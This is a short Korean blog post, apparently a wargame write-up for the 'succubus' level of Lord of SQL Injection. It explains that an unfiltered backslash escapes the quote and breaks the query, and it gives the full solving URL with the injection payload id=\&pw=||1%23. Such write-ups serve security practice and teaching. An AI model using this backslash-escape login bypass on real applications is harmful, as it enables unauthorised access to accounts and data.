---
layout: post
title: LOS SUCCUBUS 
date: 2015-10-23 00:46:00 +0900
category: Hacking
---

```
select id from prob_succubus where id='' and pw=''
```



이렇게 생겼지만 잘보면 \를 필터링 안하고 있다.



'앞에 \가 붙어버리면 다른 문자로 인식해버리기 때문에 





```
id=' \' and pw=' ' 
```

저 부분을 전부 id로 인식해 버린다. 즉 뒤에다가 || 연산만 더해주면 끝



```
http://los.sandbox.cash/chall/succubus_1e73ac44ec838508bd2b2ce2026af8cf.php?id=\&pw=||1%23
```



뒤에를 주석처리해주면 된다.



